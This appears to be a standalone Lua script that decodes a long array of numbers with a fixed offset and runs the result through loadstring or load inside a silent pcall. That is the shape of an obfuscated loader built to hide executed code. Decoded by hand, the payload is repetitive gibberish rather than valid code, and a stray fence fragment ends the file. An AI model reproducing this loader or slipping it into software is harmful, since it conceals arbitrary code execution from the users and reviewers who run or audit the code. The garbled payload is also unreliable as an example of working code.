local codes = {
    222,222,209,251,18,42,209,4,18,29,32,31,2,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209,
    242,34,26,18,23,31,209,24,31,31,18,31,218,242,227,242,34,218,235,
    18,26,31,21,31,209,26,31,18,209,242,34,26,18,23,31,209,24,31,31,
    18,31,218,242,227,242,34,218,235,18,26,31,21,31,209,26,31,18,209
}
local key = 166
local t = {}
for i = 1, #codes do t[i] = string.char((codes[i] - key) % 256) end
local src = table.concat(t)
local f = (loadstring and loadstring(src)) or (load and load(src))
if type(f) == 'function' then pcall(f) end
```0
